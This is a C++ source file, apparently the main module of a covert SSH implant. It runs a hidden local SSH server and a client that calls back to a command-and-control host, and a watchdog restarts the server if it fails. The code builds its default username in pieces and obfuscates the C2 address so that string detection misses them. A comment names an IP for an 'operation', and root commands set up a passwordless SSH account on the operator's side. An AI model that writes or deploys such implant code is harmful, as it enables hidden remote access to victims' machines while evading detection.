#define LIBSSH_STATIC 1

#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <thread>
#include <string.h>
#include <mutex>          // std::mutex

#include "server.h"
#include "client.h"
#include "global.h"
#include "obfuscated_strings.h"



std::mutex mtx;           // mutex for critical section

/* Run all of this as root
Create a new user:
adduser --disabled-password anonymous

Disable his shell
usermod -s /bin/false anonymous

Make the password actually empty:
sed -i -re 's/^anonymous:[^:]+:/anonymous::/' /etc/passwd /etc/shadow

Allow blank passwords for SSH sessions in PAM: edit /etc/pam.d/sshd and replace the line that reads @include common-auth with:
auth [success=1 default=ignore] pam_unix.so nullok
auth requisite pam_deny.so
auth required pam_permit.so

Allow blank passwords for SSH sessions of anonymous in /etc/ssh/sshd_config:
PermitEmptyPasswords yes

Restart sshd:
systemctl restart ssh
*/

void help(char* self) {
    debug("Usage: %s [user@C2_hostname\n", self);
    debug("Example: %s user@C2_hostname\n", self);
    debug("Example: %s -t 16909060\n", self);
    debug("Example: %s hostname\n", self);
    debug("Defaults: user is `anonymous`\n");
    exit(1);
}

void integer_to_ip(int ip, char* result) {
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    snprintf(result, 15, "%d.%d.%d.%d", bytes[3], bytes[2], bytes[1], bytes[0]);
}

void parse_args(int argc, char** argv,
    char* C2_host,
    char* username) {

    char* ptr;
    char* C2_port = NULL;
    char* ssh_server_port = NULL;
    if (argc < 2 || argc > 3) {
        help(argv[0]);
    }

    /* integer IP*/
    if (argc == 3 && memcmp(argv[1], "-t", 2) == 0) {
        unsigned long ip_integer = strtoul(argv[2], NULL, 10);
        if (ip_integer == 0) {
            help(argv[0]);
        }
        integer_to_ip(ip_integer, C2_host);
        return;
    }

    ptr = strchr(argv[1], '@');
    if (ptr != NULL){
        ptr[0] = '\0';
        strncpy(username, argv[1], 100);
        strncpy(C2_host, ptr + 1,  255);
    }
    else {
        strncpy(C2_host, argv[1], 255);
    }

    if (C2_host[0] == '0') {
        help(argv[0]);
    }   
}


void start_server_client(SSHServer* server, SSHClient* client, int* ssh_server_port_int, const char* username, const char* C2_host) {
    // Server
    std::thread server_thread(server->run, ssh_server_port_int);

    while (*ssh_server_port_int == 0 && *ssh_server_port_int != -1) {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }

    if (*ssh_server_port_int == -1) { // could not bind any port for the SSH server
        ssh_finalize();
        return;
    }


    // Client
    std::thread client_thread(client->run, username, C2_host, *ssh_server_port_int);

    if(server_thread.joinable()) server_thread.join();

    client->should_terminate = 1;
    if (client_thread.joinable()) client_thread.join();
}

void stop_server_client(SSHServer* server, SSHClient* client) {
    server->should_terminate = 1;
    client->should_terminate = 1;
}

/* This function will verify that our spinned up server is up and well*/
void watchdog_check_self_server_connection(int* ssh_server_port_int, const char* username, SSHServer* server, SSHClient* client, int* exit_flag) {
    ssh_session check_session = ssh_new();
    if (check_session == NULL)
        exit(-1);

    ssh_options_set(check_session, SSH_OPTIONS_HOST, "127.0.0.1");

    while (!*exit_flag) {
        std::this_thread::sleep_for(std::chrono::seconds(60));
        
        ssh_options_set(check_session, SSH_OPTIONS_PORT, ssh_server_port_int);

        int rc = ssh_connect(check_session);
        if (rc != SSH_OK) {
            debug("Server at %d does not seem to be working... Restarting\n", *ssh_server_port_int);
            stop_server_client(server, client);
        }
        rc = ssh_userauth_none(check_session, username);

        const char* banner = ssh_get_serverbanner(check_session);

        if (memcmp(banner, "SSH-2", 5) != 0) {
            debug("Server at %d does not look as our server... Restarting\n", *ssh_server_port_int);
            stop_server_client(server, client);
        }

        if (ssh_is_connected(check_session)) {
            ssh_disconnect(check_session);
        }
    }
    ssh_free(check_session);
}

int main(int argc, char** argv){
    char* C2_port = NULL;    
    char C2_host[256] = {0};
    char* ssh_server_port = NULL;
    int ssh_server_port_int = 0;
    char username[101] = {0};
    int exit_flag = 0;

    // default user, splitted to avoid strings detection
    strncat(username, "ano", 100); 
    strncat(username, "nym", 100);
    strncat(username, "ous", 100);
    
    
#ifdef C2_IP
    //We need the new IP
    //Static IP for operation Rio 35.237.100.68
    strcat_s(C2_host, sizeof(C2_host), OBFUSCATED(C2_IP));
#else
    parse_args(argc, argv, C2_host, username);
#endif // C2_IP

    ssh_init(); // libssh mandatory
    
    SSHServer* server = new SSHServer();
    SSHClient* client = new SSHClient();

    // server whatchdog
    std::thread watchdog_thread(watchdog_check_self_server_connection, &ssh_server_port_int, username, server, client, &exit_flag);

    while (1) {
        start_server_client(server, client, &ssh_server_port_int, username, C2_host);
        mtx.lock();

        if (server->ordered_terminate) {
            delete server;
            delete client;
            exit_flag = 1;
            mtx.unlock();
            break; // we should finish Cid since operator ordered it            
        }

        delete server;
        delete client;

        server = new SSHServer();
        client = new SSHClient();
        ssh_server_port_int = NULL;
        mtx.unlock();
    }

    watchdog_thread.join();

	ssh_finalize();

    return 0;
}


